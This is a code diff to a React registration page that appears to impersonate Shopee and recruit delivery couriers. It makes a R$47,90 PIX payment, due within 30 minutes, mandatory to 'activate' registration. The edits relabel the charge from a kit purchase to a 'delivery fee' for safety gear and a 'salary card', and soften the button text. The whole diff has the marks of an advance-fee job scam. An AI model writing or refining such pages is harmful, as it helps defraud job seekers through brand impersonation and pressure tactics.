@@ -642,7 +642,7 @@ const Entrega: React.FC = () => {
                       </div>
                     </div>
                     <p className="mt-4 text-gray-600 text-sm">
-                      Seu cartão personalizado será liberado após a confirmação do pagamento
+                      Seu cartão de pagamento será entregue junto com o Kit de EPI
                     </p>
                   </div>
                 </div>
@@ -773,8 +773,7 @@ const Entrega: React.FC = () => {
                     <div>
                       <h4 className="text-sm font-medium text-[#E83D22]">Informação Importante:</h4>
                       <p className="text-sm text-gray-700">
-                        Para ativar seu cadastro e se tornar um entregador Shopee, é obrigatório a aquisição do 
-                        Kit Oficial de Entregador da Shopee. O kit é entregue a preço de custo por <strong>R$47,90</strong>.
+                        Para ativar seu cadastro e se tornar um entregador Shopee, é obrigatório o pagamento da taxa de entrega do Kit EPI e do cartão salário. O valor da taxa de entrega está <strong>R$47,90</strong>.
                       </p>
                     </div>
                   </div>
@@ -791,10 +790,9 @@ const Entrega: React.FC = () => {
                       </svg>
                     </div>
                     <div>
-                      <h4 className="text-red-800 font-medium text-sm"><strong>ATENÇÃO:</strong> Aceite os termos e depois clique em "Comprar e Ativar Cadastro".</h4>
+                      <h4 className="text-red-800 font-medium text-sm"><strong>ATENÇÃO:</strong> Aceite os termos e depois clique em "Finalizar Cadastro".</h4>
                       <p className="text-red-700 text-sm mt-1">
-                        O pagamento do Kit de Segurança do Entregador é <strong>obrigatório</strong> e você precisa 
-                        adquirir este kit oficial para exercer a função de entregador Shopee.
+                        O pagamento da taxa de entrega do cartão e do Kit EPI é <strong>obrigatório</strong>.
                       </p>
                       <p className="text-red-700 text-sm mt-2">
                         Ao prosseguir, você se compromete a realizar o pagamento via PIX no prazo de 30 minutos, 
@@ -828,7 +826,7 @@ const Entrega: React.FC = () => {
                   style={{ height: '50px' }}
                   disabled={!acceptedTerms}
                 >
-                  Comprar e Ativar Cadastro
+                  Finalizar Cadastro
                 </Button>
               </form>
             </div>
@@ -853,7 +851,7 @@ const Entrega: React.FC = () => {
       >
         <DialogContent className="sm:max-w-md h-[100vh] max-h-screen overflow-y-auto p-2">
           <DialogHeader className="pb-1">
-            <DialogTitle className="text-center text-sm">Pagamento do Kit de Segurança</DialogTitle>
+            <DialogTitle className="text-center text-sm">Pagamento da taxa de Entrega</DialogTitle>
             <DialogDescription className="text-center text-xs">
               Finalize o pagamento para ativar seu cadastro Shopee
             </DialogDescription>
